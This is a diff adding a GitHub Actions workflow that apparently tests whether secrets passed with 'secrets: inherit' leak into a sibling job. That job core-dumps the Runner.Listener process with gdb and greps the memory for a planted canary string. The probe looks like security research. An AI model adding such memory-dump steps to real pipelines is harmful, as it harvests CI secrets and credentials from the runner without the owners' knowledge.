@@ -1,0 +1,23 @@
+# Mirrors containerize-uberjar.yml:
+# - calls an inner reusable workflow with secrets: inherit (like the containerize job)
+# - has a job that doesn't reference any secrets (like the run-trivy job)
+name: Middle (like containerize-uberjar)
+on:
+  workflow_call:
+jobs:
+  calls-inner:
+    uses: ./.github/workflows/inner.yml
+    secrets: inherit
+
+  no-references:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Dump Runner.Listener memory and grep for canary
+        run: |
+          sudo apt-get install -y gdb
+          pid=$(pgrep -f 'Runner.Listener' | head -1)
+          sudo gcore -o /tmp/memdump "$pid"
+          echo "=== Match count ==="
+          grep -c 'canary12345' /tmp/memdump.* || echo "NOT FOUND"
+          echo "=== Match context ==="
+          grep -ao '.\{0,40\}canary12345.\{0,40\}' /tmp/memdump.* || echo "NO CONTEXT"
